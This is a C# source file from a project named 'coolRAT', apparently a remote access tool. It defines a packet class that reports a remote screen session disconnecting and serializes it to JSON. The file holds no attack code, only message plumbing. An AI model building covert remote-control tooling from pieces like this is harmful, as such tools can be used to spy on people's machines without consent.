using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class ScreenDisconnectedPacket : Packet
    {
        public Guid UniqueScreenId;
        public bool Success;
        public ScreenDisconnectedPacket(Guid uniqueClientId, Guid uniqueScreenId, bool success) : base(uniqueClientId)
        {
            UniqueScreenId = uniqueScreenId;
            Success = success;
            Type = "ScreenDisconnectedPacket";
        }

        public new string Serialize()
        {
            return JsonConvert.SerializeObject(this);
        }

        public new static ScreenDisconnectedPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<ScreenDisconnectedPacket>(packet_string);
        }
    }
}
